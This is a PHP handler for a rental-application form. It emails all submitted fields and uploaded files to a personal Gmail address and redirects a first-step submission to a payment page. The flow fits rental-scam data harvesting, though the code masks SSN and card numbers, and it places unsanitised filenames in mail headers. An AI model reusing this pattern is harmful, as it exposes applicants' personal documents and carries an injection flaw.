<?php
if ($_SERVER['REQUEST_METHOD'] !== 'POST') { http_response_code(405); exit('Method not allowed'); }

$to = "amyngoc774@gmail.com";
$subject = "New Rental Application Submission";

function mask_sensitive($key, $value){
  $k = strtolower($key);
  if (in_array($k, ['ssn','card_number','cardnumber','cvc','cvv'])) {
    $digits = preg_replace('/\D+/', '', $value);
    $last4 = substr($digits, -4);
    if ($k === 'cvc' || $k === 'cvv') return '***';
    return '**** **** **** ' . $last4;
  }
  return $value;
}

$formType = isset($_POST['form_type']) ? $_POST['form_type'] : 'unknown';

$msgText = "Form Type: " . $formType . "\n\n";
foreach($_POST as $key=>$val){
  if ($key === 'form_type') continue;
  $msgText .= ucfirst($key) . ": " . mask_sensitive($key, $val) . "\n";
}

// MIME with attachments
$separator = md5(time());
$eol = "\r\n";
$headers  = "From: no-reply@yourdomain.com".$eol;
$headers .= "MIME-Version: 1.0".$eol;
$headers .= "Content-Type: multipart/mixed; boundary=\"".$separator."\"".$eol.$eol;

$body  = "--".$separator.$eol;
$body .= "Content-Type: text/plain; charset=\"utf-8\"" . $eol;
$body .= "Content-Transfer-Encoding: 7bit" . $eol.$eol;
$body .= $msgText . $eol;

// Attach files (single or multiple)
if (!empty($_FILES)) {
  foreach($_FILES as $field=>$file){
    if (is_array($file['name'])) {
      for($i=0;$i<count($file['name']);$i++){
        if ($file['error'][$i] === UPLOAD_ERR_OK) {
          $fname = $file['name'][$i];
          $fdata = file_get_contents($file['tmp_name'][$i]);
          $body .= "--".$separator.$eol;
          $body .= "Content-Type: application/octet-stream; name=\"".$fname."\"".$eol;
          $body .= "Content-Disposition: attachment; filename=\"".$fname."\"".$eol;
          $body .= "Content-Transfer-Encoding: base64".$eol.$eol;
          $body .= chunk_split(base64_encode($fdata)) . $eol;
        }
      }
    } else {
      if (isset($file['error']) && $file['error'] === UPLOAD_ERR_OK) {
        $fname = $file['name'];
        $fdata = file_get_contents($file['tmp_name']);
        $body .= "--".$separator.$eol;
        $body .= "Content-Type: application/octet-stream; name=\"".$fname."\"".$eol;
        $body .= "Content-Disposition: attachment; filename=\"".$fname."\"".$eol;
        $body .= "Content-Transfer-Encoding: base64".$eol.$eol;
        $body .= chunk_split(base64_encode($fdata)) . $eol;
      }
    }
  }
}

$body .= "--".$separator."--";

$sent = mail($to, $subject, $body, $headers);

if ($sent) {
  if ($formType === 'step1') {
    header("Location: payment.html");
    exit;
  } else {
    header("Location: thankyou.html");
    exit;
  }
} else {
  echo "<h2 style='font-family:Arial'>❌ Sorry, email sending failed. Please try again.</h2>";
}
?>
